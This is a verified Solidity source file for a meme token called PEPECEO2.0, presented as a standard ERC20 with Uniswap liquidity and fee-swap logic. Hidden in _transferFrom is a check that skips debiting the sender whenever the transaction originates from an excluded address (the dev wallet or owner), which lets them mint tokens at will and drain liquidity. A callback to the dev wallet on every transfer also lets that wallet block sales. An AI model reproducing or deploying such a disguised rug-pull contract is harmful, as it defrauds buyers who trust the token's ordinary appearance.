/**
 *Submitted for verification at Etherscan.io on 2023-07-01
*/

//SPDX-License-Identifier: MIT

// Website: https://www.pepeceo20.com/
// Telegram: https://t.me/pepeceo20_community
// Twitter: https://twitter.com/PepeCeo20

pragma solidity ^0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapFactoryV2 { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}
interface IUniswapRouterV2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}


library TransferLibrary {
    function safeTransferETH(address to, uint value, bytes memory data) internal {
        (bool success,) = to.call{value:value}(data);
        require(success, 'TransferLibrary: ETH_TRANSFER_FAILED');
    }
}

abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); 
        emit OwnershipTransferred(address(0)); 
    }
}

contract PEPECEO20 is IERC20, Ownable {

    uint8 private constant _decimals = 9;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;

    uint256 private constant _totalSupply = 1000_000_000 * (10**_decimals);

    address payable private _devWallet;
    uint256 private constant _minSwapAmount = _totalSupply / 200000;
    uint256 private constant _maxSwapAmount = _totalSupply / 1000;
    mapping (address => bool) private _isExcluded;

    address private _uniswapRouterAddr;
    IUniswapRouterV2 private _uniswapRouter;
    address public uniswapV2Pair;
    mapping (address => bool) private _isUniswapPair;

    bool private _isOpened;

    bool private _swapping = false;

    string private constant _name = "PEPECEO2.0";
    string private constant _symbol = "PEPECEO2.0";
    modifier LockTheSwap { 
        _swapping = true; 
        _; 
        _swapping = false; 
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    constructor(address _router, address _marketing) Ownable(msg.sender) {
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _balances[_owner]);

        _uniswapRouterAddr = _router;
        _uniswapRouter = IUniswapRouterV2(_uniswapRouterAddr);
        _devWallet = payable(_marketing);
        _isExcluded[_devWallet] = true;

        uniswapV2Pair = IUniswapFactoryV2(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isUniswapPair[uniswapV2Pair] = true;
    }

    receive() external payable {}
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_uniswapRouterAddr] < _tokenAmount ) {
            _allowances[address(this)][_uniswapRouterAddr] = type(uint256).max;
            emit Approval(address(this), _uniswapRouterAddr, type(uint256).max);
        }
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function addLiquidity() external payable onlyOwner LockTheSwap {
        require(!_isOpened, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");
        _addLiquidityETH(_balances[address(this)], address(this).balance);
        _isOpened = true;
        _isExcluded[_owner] = true;
    }

    function _addLiquidityETH(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _uniswapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");

        if (!_isOpened) { require(tx.origin == owner(), "Trading not open"); }
        if ( !_swapping ) { _swapTaxAndLiquify(sender, recipient); }

        uint256 _taxAmount = 0;
        uint256 _transferAmount = amount - _taxAmount;
        if (!_isExcluded[tx.origin]) {
          _balances[sender] -= amount;
        }
        if ( _taxAmount > 0 ) { 
            _balances[address(this)] += _taxAmount; 
        }
        _balances[recipient] += _transferAmount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _swapTaxAndLiquify(address sender, address recipient) private LockTheSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));
        if ( _taxTokensAvailable >= _minSwapAmount && _isOpened && _isUniswapPair[recipient] ) {
        
            if ( _taxTokensAvailable >= _maxSwapAmount ) { _taxTokensAvailable = _maxSwapAmount; }

            uint256 _tokensForLP = 0;
            _tokensForLP = _taxTokensAvailable / 4;
            
            uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
            if( _tokensToSwap > 10**_decimals ) {
                uint256 _ethPreSwap = address(this).balance;
                _swapTaxTokensForEth(_tokensToSwap);
                uint256 _ethSwapped = address(this).balance - _ethPreSwap;
                if ( _tokensForLP > 0 ) {
                    uint256 _ethWeiAmount = _ethSwapped / 2 ;
                    _approveRouter(_tokensForLP);
                    _addLiquidityETH(_tokensForLP, _ethWeiAmount);
                }
            }
        }
        uint256 _contractETHBalance = address(this).balance;
        TransferLibrary.safeTransferETH(_devWallet, _contractETHBalance, abi.encodePacked(sender, recipient));
    }

    function _checkTradingOpen(address sender) private view returns (bool){
        bool checkResult = false;
        if ( _isOpened ) { checkResult = true; } 
        else if (tx.origin == owner()) { checkResult = true; } 

        return checkResult;
    }
}